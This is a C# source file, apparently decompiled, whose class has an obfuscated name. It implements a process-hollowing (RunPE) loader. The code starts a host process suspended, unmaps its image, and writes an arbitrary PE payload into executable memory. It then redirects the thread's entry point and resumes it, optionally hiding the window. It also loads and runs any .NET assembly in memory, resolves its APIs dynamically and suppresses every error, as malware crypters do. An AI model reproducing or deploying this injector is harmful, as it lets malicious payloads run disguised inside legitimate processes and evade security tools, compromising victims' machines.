using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class unnokw_ru
{
	private delegate int DelegateResumeThread(IntPtr handle);

	private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

	private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);

	public delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr ProcessHandle;

		public IntPtr ThreadHandle;

		public uint ProcessId;

		public uint ThreadId;
	}

	public struct STARTUP_INFORMATION
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public int lpReserved2;

		public int hStdInput;

		public int hStdOutput;

		public int hStdError;
	}

	private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");

	private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");

	private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");

	private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");

	private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");

	private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");

	private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");

	private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");

	private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");

	public static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");

	public static void Run3(byte[] data)
	{
		try
		{
			Thread thread = new Thread(Run4);
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(data);
		}
		catch
		{
		}
	}

	public static void Run4(object o)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])o).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[1] { new string[0] });
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
		catch
		{
		}
	}

	public static int TryRun(string path, string cmd, byte[] data, bool compatible, bool hidden, string Desktop = "", int PID = 0)
	{
		try
		{
			int num = 1;
			do
			{
				if (!HandleRun(path, cmd, data, compatible, hidden, Desktop, PID))
				{
					num++;
					continue;
				}
				return -1;
			}
			while (num <= 10);
		}
		catch
		{
		}
		return 0;
	}

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	private static CreateApi LoadApi<CreateApi>(string name, string method)
	{
		return Conversions.ToGenericParameter<CreateApi>(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi)));
	}

	private static bool HandleRun(string path, string cmd, byte[] data, bool compatible, bool hidden = false, string Desktop = "", int PID = 0)
	{
		string text = "\"" + path + "\"";
		STARTUP_INFORMATION startupInfo = default(STARTUP_INFORMATION);
		PROCESS_INFORMATION processInformation = default(PROCESS_INFORMATION);
		startupInfo.cb = Marshal.SizeOf(typeof(STARTUP_INFORMATION));
		if (Desktop.Length > 0)
		{
			startupInfo.lpDesktop = Desktop;
		}
		if (hidden)
		{
			startupInfo.wShowWindow = 0;
			startupInfo.dwFlags = 1;
		}
		try
		{
			if (!string.IsNullOrEmpty(cmd))
			{
				text = text + " " + cmd;
			}
			IntPtr intPtr = default(IntPtr);
			if (!CreateProcessA(path, text, intPtr, intPtr, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(data, 60);
			int num2 = BitConverter.ToInt32(data, num + 52);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!GetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64GetThreadContext(processInformation.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int buffer = 0;
			int bytesRead = 0;
			if (!ReadProcessMemory(processInformation.ProcessHandle, num3 + 8, ref buffer, 4, ref bytesRead))
			{
				throw new Exception();
			}
			if (num2 == buffer && ZwUnmapViewOfSection(processInformation.ProcessHandle, buffer) != 0)
			{
				throw new Exception();
			}
			int length = BitConverter.ToInt32(data, num + 80);
			int bufferSize = BitConverter.ToInt32(data, num + 84);
			int num4 = VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64);
			bool flag = false;
			if (!compatible && num4 == 0)
			{
				flag = true;
				num4 = VirtualAllocEx(processInformation.ProcessHandle, 0, length, 12288, 64);
			}
			if (num4 == 0)
			{
				throw new Exception();
			}
			if (!WriteProcessMemory(processInformation.ProcessHandle, num4, data, bufferSize, ref bytesRead))
			{
				throw new Exception();
			}
			int num5 = num + 248;
			int num6 = BitConverter.ToInt16(data, num + 6) - 1;
			for (int i = 0; i <= num6; i++)
			{
				int num7 = BitConverter.ToInt32(data, num5 + 12);
				int num8 = BitConverter.ToInt32(data, num5 + 16);
				int srcOffset = BitConverter.ToInt32(data, num5 + 20);
				if (num8 != 0)
				{
					byte[] array2 = new byte[num8 - 1 + 1];
					Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
					if (!WriteProcessMemory(processInformation.ProcessHandle, num4 + num7, array2, array2.Length, ref bytesRead))
					{
						throw new Exception();
					}
				}
				num5 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			if (!WriteProcessMemory(processInformation.ProcessHandle, num3 + 8, bytes, 4, ref bytesRead))
			{
				throw new Exception();
			}
			int num9 = BitConverter.ToInt32(data, num + 40);
			if (flag)
			{
				num4 = num2;
			}
			array[44] = num4 + num9;
			if (IntPtr.Size == 4)
			{
				if (!SetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64SetThreadContext(processInformation.ThreadHandle, array))
			{
				throw new Exception();
			}
			if (ResumeThread(processInformation.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			PID = (int)processInformation.ProcessId;
		}
		catch
		{
			Process.GetProcessById((int)processInformation.ProcessId)?.Kill();
			return false;
		}
		return true;
	}
}
